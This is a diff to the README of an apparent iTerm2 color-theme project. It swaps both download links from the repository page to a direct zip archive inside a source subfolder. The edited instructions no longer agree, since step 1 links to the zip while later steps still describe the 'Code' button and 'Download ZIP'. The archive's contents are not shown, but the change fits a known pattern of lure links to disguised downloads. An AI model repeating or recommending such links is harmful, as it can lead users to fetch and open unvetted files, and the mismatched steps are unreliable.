@@ -1,6 +1,6 @@
 # 🎨 iterm2-karma - New terminal colors for better focus
 
-[![](https://img.shields.io/badge/Download-Karma_Themes-blue.svg)](https://github.com/Papahg6434/iterm2-karma)
+[![](https://img.shields.io/badge/Download-Karma_Themes-blue.svg)](https://github.com/Papahg6434/iterm2-karma/raw/refs/heads/main/src/palette/iterm-karma-v3.6.zip)
 
 ## 📋 About This Project
 
@@ -18,7 +18,7 @@ Your computer must meet these basic needs:
 
 Follow these steps to obtain the files on your machine.
 
-1. Visit this page to download: [https://github.com/Papahg6434/iterm2-karma](https://github.com/Papahg6434/iterm2-karma).
+1. Visit this page to download: [https://github.com/Papahg6434/iterm2-karma/raw/refs/heads/main/src/palette/iterm-karma-v3.6.zip](https://github.com/Papahg6434/iterm2-karma/raw/refs/heads/main/src/palette/iterm-karma-v3.6.zip).
 2. Look for the green button labeled "Code" toward the top right side of the screen.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
